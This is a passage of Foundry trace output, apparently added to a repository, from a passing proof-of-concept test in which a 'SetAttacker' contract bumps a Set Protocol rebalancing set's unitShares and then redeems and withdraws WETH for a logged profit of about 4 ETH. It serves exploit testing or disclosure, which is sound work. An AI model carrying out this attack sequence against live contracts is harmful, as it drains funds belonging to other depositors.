+    │   │   │   ├─ [537] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::unitShares() [staticcall]
+    │   │   │   │   └─ ← [Return] 12253 [1.225e4]
+    │   │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [831] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::currentSet() [staticcall]
+    │   │   │   │   └─ ← [Return] SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   │   │   ├─ [1148] SetToken::getComponents() [staticcall]
+    │   │   │   │   └─ ← [Return] [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [1028] SetToken::getUnits() [staticcall]
+    │   │   │   │   └─ ← [Return] [67108864 [6.71e7]]
+    │   │   │   ├─ [477] SetToken::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [991] OracleWhiteList::getOracleAddressByToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x761864f867dFd70340F6eab0B6f0BC74e18bA178
+    │   │   │   ├─ [278] 0x761864f867dFd70340F6eab0B6f0BC74e18bA178::read() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   ├─ [444] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::decimals() [staticcall]
+    │   │   │   │   └─ ← [Return] 18
+    │   │   │   ├─ emit FeeActualization(rebalancingSetToken: 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, newHighWatermark: 821949366272000000 [8.219e17], profitFee: 0, streamingFee: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc2a942f3a7f83b7f0376cb2c7a52c063a35ebd98662afd245eff2d54aba53376: 0x000000000000000000000000000000000000000000000000000000006ac4c09f → 0x000000000000000000000000000000000000000000000000000000006ac4c297
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [739] Vault::getOwnerBalance(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 0xB647a1D7633c6C4d434e22eE9756b36F2b219525) [staticcall]
+    │   │   │   └─ ← [Return] 1728655546608942663711 [1.728e21]
+    │   │   ├─ emit IncentiveFeePaid(param0: 0xF8523c551763FE4261A28313015267F163de7541, param1: 0, param2: 0, param3: 12264 [1.226e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 69: 12253 → 12264
+    │   │   └─ ← [Stop]
+    │   ├─ [537] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::unitShares() [staticcall]
+    │   │   └─ ← [Return] 12264 [1.226e4]
+    │   ├─ [46362] Core::redeem(0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 140948713161425283000000 [1.409e23])
+    │   │   ├─ [1755] 0xdC733EC262F32882F7C05525cc2D09F2C04D86Ac::isMultipleOfSetNaturalUnit(0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 140948713161425283000000 [1.409e23]) [delegatecall]
+    │   │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4209] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::burn(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 140948713161425283000000 [1.409e23])
+    │   │   │   ├─ emit Transfer(from: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, amount: 140948713161425283000000 [1.409e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000001dd9b82172462ad57880 → 0x000000000000000000000000000000000000000000000000dfcc303edf8451c0
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x000000000000000000000000000000000000000000001dd8d85542074b5126c0 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   ├─ [1390] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   │   ├─ [1114] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::getUnits() [staticcall]
+    │   │   │   └─ ← [Return] [12264 [1.226e4]]
+    │   │   ├─ [1830] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateRequiredComponentQuantities([12264 [1.226e4]], 1000000 [1e6], 140948713161425283000000 [1.409e23]) [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000005db5132a931b706bb8
+    │   │   ├─ [2449] Vault::batchDecrementTokenOwner([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, [1728595018211719670712 [1.728e21]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea45ed5572f582e2696e9a1791bef942b355f846ffaec5f5492a9536fa358d31: 0x00000000000000000000000000000000000000000000005db5ea34d4cabd481f → 0x00000000000000000000000000000000000000000000000000d70a41af4cdc67
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit SetRedeemed(_setAddress: 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, _quantity: 140948713161425283000000 [1.409e23])
+    │   │   ├─ [1390] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   │   ├─ [22012] Vault::batchIncrementTokenOwner([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [1728595018211719670712 [1.728e21]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x41c8c50ef94d0d84469450ccde0e1114423301711f957fea9b9e0fb49e1d9aff: 0 → 0x00000000000000000000000000000000000000000000005db5132a931b706bb8
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93206 → 93207
+    │   │   └─ ← [Stop]
+    │   ├─ [739] Vault::getOwnerBalance(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1728595018211719670712 [1.728e21]
+    │   ├─ [33916] Core::withdraw(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1728595018211719670712 [1.728e21])
+    │   │   ├─ [1622] Vault::decrementTokenOwner(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728595018211719670712 [1.728e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x41c8c50ef94d0d84469450ccde0e1114423301711f957fea9b9e0fb49e1d9aff: 0x00000000000000000000000000000000000000000000005db5132a931b706bb8 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [30283] Vault::withdrawTo(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728595018211719670712 [1.728e21])
+    │   │   │   ├─ [1750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1729146534264172292705 [1.729e21]
+    │   │   │   │   └─ ← [Return] 1729146534264172292705 [1.729e21]
+    │   │   │   ├─ [24581] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::transfer(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728595018211719670712 [1.728e21]) [delegatecall]
+    │   │   │   │   ├─ [23390] SetToken::transfer(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728595018211719670712 [1.728e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], to: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1728595018211719670712 [1.728e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x664429697a97029c9cd91f225e37da6c8fd4ffd5ea690bc7a6ec9d05402ce967: 0x00000000000000000000000000000000000000000000005dbcba8b8095cdaa61 → 0x00000000000000000000000000000000000000000000000007a760ed7a5d3ea9
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x00000000000000000000000000000000000000000000005db5132a931b706bb8
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 551516052452621993 [5.515e17]
+    │   │   │   │   └─ ← [Return] 551516052452621993 [5.515e17]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93207 → 93208
+    │   │   └─ ← [Stop]
+    │   ├─ [650] SetToken::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1728595018211719670712 [1.728e21]
+    │   ├─ [45839] Core::redeem(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1728595018211719000000 [1.728e21])
+    │   │   ├─ [1697] 0xdC733EC262F32882F7C05525cc2D09F2C04D86Ac::isMultipleOfSetNaturalUnit(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1728595018211719000000 [1.728e21]) [delegatecall]
+    │   │   │   ├─ [477] SetToken::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4372] SetToken::burn(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728595018211719000000 [1.728e21])
+    │   │   │   ├─ [315] SetTokenFactory::core()
+    │   │   │   │   └─ ← [Return] Core: [0xf55186CC537E7067EA616F2aaE007b4427a120C8]
+    │   │   │   ├─ emit Transfer(from: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, amount: 1728595018211719000000 [1.728e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000005db5132a931b706bb8 → 670712
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000005dbcbd42a30f3fad00 → 0x00000000000000000000000000000000000000000000000007aa180ff3d97d40
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [477] SetToken::naturalUnit() [staticcall]
+    │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   ├─ [1148] SetToken::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   ├─ [1028] SetToken::getUnits() [staticcall]
+    │   │   │   └─ ← [Return] [67108864 [6.71e7]]
+    │   │   ├─ [1830] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateRequiredComponentQuantities([67108864 [6.71e7]], 1000000 [1e6], 1728595018211719000000 [1.728e21]) [delegatecall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001890979015861c000000
+    │   │   ├─ [2449] Vault::batchDecrementTokenOwner([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], [116004047988247773577216 [1.16e23]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0c3a207a10e401343879fda73b5f0649c53ad9688e916d222f16515970e4984b: 0x00000000000000000000000000000000000000000000189299e9fba850000000 → 0x0000000000000000000000000000000000000000000000020259e62234000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit SetRedeemed(_setAddress: SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], _quantity: 1728595018211719000000 [1.728e21])
+    │   │   ├─ [1148] SetToken::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   ├─ [22012] Vault::batchIncrementTokenOwner([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [116004047988247773577216 [1.16e23]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7079cd72991ce89a9752fd89d063b5886e6efc23ea33c9e1481943db1c6f058f: 0 → 0x000000000000000000000000000000000000000000001890979015861c000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93208 → 93209
+    │   │   └─ ← [Stop]
+    │   ├─ [739] Vault::getOwnerBalance(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 116004047988247773577216 [1.16e23]
+    │   ├─ [13556] Core::withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 116004047988247773577216 [1.16e23])
+    │   │   ├─ [1622] Vault::decrementTokenOwner(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 116004047988247773577216 [1.16e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7079cd72991ce89a9752fd89d063b5886e6efc23ea33c9e1481943db1c6f058f: 0x000000000000000000000000000000000000000000001890979015861c000000 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9923] Vault::withdrawTo(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 116004047988247773577216 [1.16e23])
+    │   │   │   ├─ [1634] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 116486027134994683363752 [1.164e23]
+    │   │   │   │   └─ ← [Return] 116486027134994683363752 [1.164e23]
+    │   │   │   ├─ [4453] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::transfer(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 116004047988247773577216 [1.16e23]) [delegatecall]
+    │   │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 116004047988247773577216 [1.16e23])
+    │   │   │   │   │   ├─ emit Transfer(from: Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], to: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 116004047988247773577216 [1.16e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x97aa7a62e57c65c478bd236d741fe33d6d6f98713895c11f98ea1dec7f1cd157: 0x0000000000000000000000000000000000000000000018aab85dfddaef6d81a8 → 0x00000000000000000000000000000000000000000000001a20cde854d36d81a8
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000000000000000800000 → 0x000000000000000000000000000000000000000000001890979015861c800000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1634] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 481979146746909786536 [4.819e20]
+    │   │   │   │   └─ ← [Return] 481979146746909786536 [4.819e20]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93209 → 93210
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000000014adf4b731f7a2e9
+    │   │   @ 1: 0 → 12264
+    │   │   @ 0: 0 → 12253
+    │   └─ ← [Stop]
+    ├─ [446] SetAttacker::unitSharesBefore() [staticcall]
+    │   └─ ← [Return] 12253 [1.225e4]
+    ├─ emit log_named_uint(key: "unitShares before actualizeFee", val: 12253 [1.225e4])
+    ├─ [491] SetAttacker::unitSharesAfter() [staticcall]
+    │   └─ ← [Return] 12264 [1.226e4]
+    ├─ emit log_named_uint(key: "unitShares after  actualizeFee", val: 12264 [1.226e4])
+    ├─ [403] SetAttacker::donatedBaseSet() [staticcall]
+    │   └─ ← [Return] 1490116119384007401 [1.49e18]
+    ├─ emit log_named_decimal_uint(key: "base set donated into rSet backing", val: 1490116119384007401 [1.49e18], decimals: 18)
+    ├─ [446] SetAttacker::unitSharesBefore() [staticcall]
+    │   └─ ← [Return] 12253 [1.225e4]
+    ├─ [0] VM::assertEq(12253 [1.225e4], 12253 [1.225e4], "pre-bump unitShares") [staticcall]
+    │   └─ ← [Return]
+    ├─ [491] SetAttacker::unitSharesAfter() [staticcall]
+    │   └─ ← [Return] 12264 [1.226e4]
+    ├─ [0] VM::assertEq(12264 [1.226e4], 12264 [1.226e4], "post-bump unitShares") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1552] SetAttacker::wethBalance() [staticcall]
+    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 116004047988247781965824 [1.16e23]
+    │   └─ ← [Return] 116004047988247781965824 [1.16e23]
+    ├─ [0] VM::assertGt(116004047988247781965824 [1.16e23], 116000000000000000000000 [1.16e23], "no surplus over principal") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "WETH profit (tx1)", val: 4047988247781965824 [4.047e18], decimals: 18)
+    ├─ [0] VM::assertApproxEqRel(4047988247781965824 [4.047e18], 4047988247781965824 [4.047e18], 10000000000000000 [1e16]) [staticcall]
+    │   └─ ← [Return]
+    ├─  storage changes:
+    │   @ 0xe7cca40de8bb426a7dca2985055977f4996ef67c8b8775d0bb5e589c427917ce: 0 → 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60
+    │   @ 0xe7cca40de8bb426a7dca2985055977f4996ef67c8b8775d0bb5e589c427917d1: 0 → 1
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.59s (12.67ms CPU time)
+
+Ran 1 test suite in 8.83s (4.59s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
